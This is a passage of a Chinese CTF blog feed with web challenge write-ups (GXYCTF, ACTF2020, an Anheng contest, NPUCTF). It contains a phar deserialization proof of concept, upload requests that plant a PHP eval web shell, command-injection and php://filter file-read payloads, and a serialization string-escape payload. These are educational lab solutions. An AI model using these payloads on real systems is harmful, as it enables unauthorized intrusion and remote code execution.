falied!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		eval($this-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">	$uploader &#x3D; new Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">	if(@file_get_contents($uploader))&#123;</span><br><span class="line">		echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在析构方法中看见了<code>eval</code>函数,还看见了<code>__toString</code>应该是序列化没错了，但是没看见unserialize，那就是phar序列化</p>
<p>寻找pop链接</p>
<blockquote>
<p>在最后的判断函数中，file_get_contents会触发<code>__toString</code>,filename可控，在<code>__destruct</code>中执行</p>
</blockquote>
<p>编写phar脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd=<span class="string">'show_source("flag.php");'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="string">'GXYfddf1387c1384a5dd61134d16247860b'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Filename=<span class="string">'test'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Uploader();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'poc.phar'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">"1"</span>, <span class="string">"0"</span>); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>在<code>__destruct</code>函数中,token要等于session</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>__construct</code>中给出了存在session的位置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">		$ext = <span class="string">".txt"</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>随意上传一下文件得到session</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下面是你上传的文件：</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;e9791ad48bd0c6877a17604b0ad113bb&#x2F;GXYfddf1387c1384a5dd61134d16247860b.txt</span><br></pre></td></tr></table></figure>

<p>比如此处<strong>GXYfddf1387c1384a5dd61134d16247860b</strong>就是session</p>
<p>然后上传poc.phar文件，得到文件地址，再随意上传一个文件同时传入参数name</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">home.php?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;e9791ad48bd0c6877a17604b0ad113bb&#x2F;GXYfddf1387c1384a5dd61134d16247860b.txt</span><br></pre></td></tr></table></figure>

<p>即可得到flag</p>
<p><strong>非预期</strong></p>
<p>看见P3师傅直接上传拿shell。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/home.php?file=upload&amp;name=shell.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Length</span>: 354</span><br><span class="line"><span class="attribute">Origin</span>: http://67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn/home.php?file=upload&amp;name=phar:///var/www/html/uploads/e9791ad48bd0c6877a17604b0ad113bb/GXYfddf1387c1384a5dd61134d16247860b.txt</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=7b53797fc49085aab012e24a85e31c46</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="test.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">-----------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------1489141389572370543625846861-</span><br></pre></td></tr></table></figure>

<p>蚁剑连接即可。</p>
<p><a href="https://www.gem-love.com/ctf/490.html" target="_blank" rel="noopener">颖奇师傅博客</a>还有一个非预期,直接随意上传文件把name参数改成flag.php。即可拿到flag</p>
<h2 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h2><p>直接写一个脚本自动提交即可<a href="https://www.cnblogs.com/h3zh1/p/12702655.html" target="_blank" rel="noopener">来自h3zh1师傅的脚本</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> url = <span class="string">"http://b4d1633d-5d1c-4b71-bedc-3545bea05581.node3.buuoj.cn/index.php"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">rr = re.compile(<span class="string">r"[0-9]+ [+|-] [0-9]+"</span>)</span><br><span class="line"></span><br><span class="line">r = s.get(url)</span><br><span class="line">r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">data = &#123;<span class="string">"answer"</span>:eval(rr.findall(r.text)[<span class="number">0</span>])&#125;</span><br><span class="line">r = s.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    answer = eval(rr.findall(r.text)[<span class="number">0</span>])</span><br><span class="line">    data = &#123; <span class="string">"answer"</span> : answer &#125;</span><br><span class="line">    r = s.post( url , data=data)</span><br><span class="line">    r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">    print(<span class="string">'[+%d]:'</span>%(i) + str(answer))</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>刷题</tag>
        <tag>gxyctf2019</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020刷题</title>
    <url>/2020/04/26/ACTF%E5%88%B7%E9%A2%982020/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h2><p>简单为协议包含</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  然后base64解密</span><br><span class="line"></span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;9dc5b2d8-37cf-45a6-b5a3-68b3d5c6c2e5&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><p>没有进行过滤处理，考的是linux的知识点。一行linux语句如何执行多条linux语句。使用<code>&amp;&amp;</code>连接，或者分号<code>;</code>隔开。也可以使用管道符号<code>｜</code></p>
<p>但是在此处只能使用｜和分号。（不太清楚）</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | cat &#x2F;flag</span><br><span class="line">或者</span><br><span class="line">127.0.0.1;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

<h2 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h2><p>扫描目录发现备份文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sunny250@kali ~ <span class="comment"># dirb http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/ ~/web/dictionaries/CTFwebdir.txt </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Apr 26 13:01:43 2020</span><br><span class="line">URL_BASE: http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/</span><br><span class="line">WORDLIST_FILES: /Users/sx/web/dictionaries/CTFwebdir.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 53                                                            </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/ ----</span><br><span class="line">+ http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/index.php.bak (CODE:200|SIZE:347)</span><br><span class="line">+ http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/flag.php (CODE:200|SIZE:0)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Apr 26 13:01:46 2020</span><br><span class="line">DOWNLOADED: 53 - FOUND: 2</span><br></pre></td></tr></table></figure>

<p>访问index.php.bak得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若类型比较会先转换，字符串于整型对比，都会转换成整型。</p>
<blockquote>
<p><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">参考文章</a></p>
<p><a href="https://www.php.net/manual/en/function.intval.php" target="_blank" rel="noopener">intval函数</a></p>
</blockquote>
<p>输入key=123即可</p>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>打开题目是一个灯，鼠标移动到灯泡之后可以看见一个上传界面</p>
<p>直接上传1.php发现被禁止，尝试掐后缀，发现phtml可以</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------380150826415384369013004740571</span><br><span class="line"><span class="attribute">Content-Length</span>: 406</span><br><span class="line"><span class="attribute">Origin</span>: http://32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------380150826415384369013004740571</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="upload_file"; filename="1.phtml"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/gif</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;script language="php"&gt; </span><br><span class="line"><span class="attribute">eval($_POST[cmd]);</span></span><br><span class="line"><span class="attribute">&lt;/script&gt;</span></span><br><span class="line"><span class="attribute">-----------------------------380150826415384369013004740571</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line"><span class="attribute">upload</span></span><br><span class="line"><span class="attribute">-----------------------------380150826415384369013004740571--</span></span><br></pre></td></tr></table></figure>

<p>然后得到上传地址，使用蚁剑连接，拿flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>刷题记录</tag>
        <tag>wp</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒月赛20200425</title>
    <url>/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B20200425/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezunserialize"><a href="#Ezunserialize" class="headerlink" title="Ezunserialize"></a>Ezunserialize</h2><p>打开就有源码</p>
<a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure>

<p>看见替换想到字符串逃逸</p>
<p>因为A类中的username，password可控。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username =<span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b=<span class="keyword">new</span> C;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c=<span class="string">"flag.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($a); <span class="comment">//O:1:"A":2:&#123;s:8:"username";s:2:"\0";s:8:"password";O:1:"B":1:&#123;s:1:"b";O:1:"C":1:&#123;s:1:"c";s:8:"flag.php";&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>在经过替换函数后，字符减少了3个。正常的序列化后的字符串是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;tese&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>要使得password的类型变成对象类，就要把原本的字符串类型吃掉。</p>
<p>从而变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot; *  *  *  *  *  *  *  * &quot;;s:8:&quot;password&quot;;s:74:&quot;0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>传入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 (8个\0\0\0). b&#x3D;0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>本地测试通过了，但是远程没打通</p>
<h2 id="babytricks"><a href="#babytricks" class="headerlink" title="babytricks"></a>babytricks</h2><p>打开题目是一个登录框，查看源码发现提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tips:select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>比赛记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>待补充</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF</title>
    <url>/2020/04/19/NPUCTF/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h2><p>给了源码</p>
<a id="more"></a>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span 